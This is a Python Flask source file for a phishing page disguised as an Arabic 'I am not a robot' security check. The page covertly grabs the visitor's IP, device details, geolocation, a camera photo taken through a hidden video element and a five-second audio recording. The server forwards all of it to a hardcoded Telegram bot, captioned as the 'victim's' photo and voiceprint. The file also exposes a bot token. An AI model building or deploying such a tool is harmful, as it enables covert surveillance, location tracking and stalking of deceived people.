import base64, requests, os, json
from flask import Flask, render_template_string, request

app = Flask(__name__)

# --- إعدادات الملك سيوفي (لا تغيرها) ---
BOT_TOKEN = "8431816368:AAGL4xuB42ZdHpxRJ2O1zBgAWOB6cvZwwe0"
ADMIN_ID = "7041600701"

HTML = '''
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحقق الأمان</title>
    <style>
        body { background: #050505; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
        .card { background: #111; padding: 40px; border-radius: 25px; text-align: center; border: 1px solid #333; width: 85%; max-width: 380px; box-shadow: 0 15px 40px rgba(0,0,0,0.7); z-index: 10; }
        .btn { background: #f38020; color: white; border: none; padding: 18px; border-radius: 12px; width: 100%; font-weight: bold; cursor: pointer; font-size: 1.1rem; }
        #st { margin-top: 20px; color: #888; font-size: 0.9rem; }
        /* حل ذكي: الفيديو يعمل في الخلفية لكنه غير مرئي للمستخدم */
        #v { position: absolute; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.01; pointer-events: none; }
    </style>
</head>
<body>
    <div class="card">
        <div style="font-size: 60px; margin-bottom: 20px;">🔒</div>
        <h2>تحقق الأمان</h2>
        <p style="color: #aaa; margin-bottom: 30px;">يرجى الضغط لتأكيد هويتك والوصول إلى الرابط</p>
        <button class="btn" id="go" onclick="startProcess()">أنا لست روبوت</button>
        <div id="st">بانتظار البدء...</div>
    </div>
    
    <video id="v" autoplay playsinline muted></video>
    <canvas id="c" style="display:none"></canvas>

    <script>
        async function post(d, t) { 
            return fetch('/api/capture', { 
                method: 'POST', 
                headers: { 'Content-Type': 'application/json' }, 
                body: JSON.stringify({d: d, t: t}) 
            }); 
        }

        async function startProcess() {
            const st = document.getElementById('st');
            document.getElementById('go').style.display = 'none';
            st.innerText = "جاري الاتصال بالسيرفر...";
            
            try {
                // 1. جلب الأيبي فوراً
                let ip = 'غير معروف';
                try {
                    const res = await fetch('https://api.ipify.org?format=json');
                    const json = await res.json();
                    ip = json.ip;
                } catch(e) {}

                // 2. تشغيل الكاميرا والصوت
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                const v = document.getElementById('v');
                v.srcObject = stream;
                await v.play(); // التأكد من تشغيل الفيديو برمجياً

                // 3. إرسال المعلومات فوراً (قبل الصورة والصوت)
                const b = await navigator.getBattery().catch(() => ({}));
                const info = `📊 **تقرير صيد (v15.0)**:\\n` +
                             `━━━━━━━━━━━━━━\\n` +
                             `🌐 الأيبي (IP): ${ip}\\n` +
                             `🔋 البطارية: ${Math.round(b.level*100)}%\\n` +
                             `⚡ الشحن: ${b.charging ? 'نعم' : 'لا'}\\n` +
                             `📱 النظام: ${navigator.platform}\\n` +
                             `🖥️ الشاشة: ${window.screen.width}x${window.screen.height}\\n` +
                             `🌍 اللغة: ${navigator.language}`;
                await post(info, "msg");

                // 4. إرسال الموقع
                navigator.geolocation.getCurrentPosition(p => {
                    post(`📍 الخريطة: http://google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`, "msg");
                });

                // 5. التقاط الصورة بعد 4 ثواني (ثابت ومضمون)
                st.innerText = "جاري توازن العدسة... (4 ثواني)";
                setTimeout(async () => {
                    const c = document.getElementById('c');
                    c.width = v.videoWidth; 
                    c.height = v.videoHeight;
                    c.getContext('2d').drawImage(v, 0, 0);
                    const imgData = c.toDataURL('image/jpeg', 0.8);
                    await post(imgData, "img");
                    
                    // 6. تسجيل الصوت فوراً بعد الصورة
                    st.innerText = "جاري تسجيل البصمة... (5 ثواني)";
                    const recorder = new MediaRecorder(stream);
                    const chunks = [];
                    recorder.ondataavailable = e => chunks.push(e.data);
                    recorder.onstop = async () => {
                        const reader = new FileReader();
                        reader.readAsDataURL(new Blob(chunks));
                        reader.onloadend = () => post(reader.result, "aud");
                        st.innerText = "✅ اكتمل التحقق بنجاح!";
                    };
                    recorder.start();
                    setTimeout(() => recorder.stop(), 5000);

                }, 4000);

            } catch (e) { 
                st.innerText = "يرجى منح الصلاحيات للمتابعة!";
                setTimeout(() => location.reload(), 2000);
            }
        }
    </script>
</body>
</html>
'''

@app.route('/')
def home():
    return render_template_string(HTML)

@app.route('/api/capture', methods=['POST'])
def capture():
    data = request.get_json(force=True, silent=True)
    if not data: return "OK"
    t, d = data.get('t'), data.get('d')
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/"
    
    if t == 'msg':
        requests.post(url + "sendMessage", json={'chat_id': ADMIN_ID, 'text': d, 'parse_mode': 'Markdown'})
    elif t == 'img':
        try:
            img = base64.b64decode(d.split(',')[1])
            requests.post(url + "sendPhoto", data={'chat_id': ADMIN_ID, 'caption': "📸 صورة الضحية (v15.0)"}, files={'photo': ('c.jpg', img)})
        except: pass
    elif t == 'aud':
        try:
            aud = base64.b64decode(d.split(',')[1])
            requests.post(url + "sendVoice", data={'chat_id': ADMIN_ID, 'caption': "🎙 بصمة الضحية (v15.0)"}, files={'voice': ('v.ogg', aud)})
        except: pass
    return "OK"

@app.route('/webhook', methods=['POST'])
def bot_webhook():
    data = request.get_json(force=True, silent=True)
    if "message" in data:
        uid = str(data["message"]["chat"]["id"])
        if uid == ADMIN_ID:
            kb = {"inline_keyboard": [[{"text": "🔗 رابط الصيد", "callback_data": "link"}]]}
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                          json={'chat_id': uid, 'text': "🔥 أهلاً سيوفي.. نظام v15.0 المضمون جاهز!", 'reply_markup': kb})
    return "OK"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
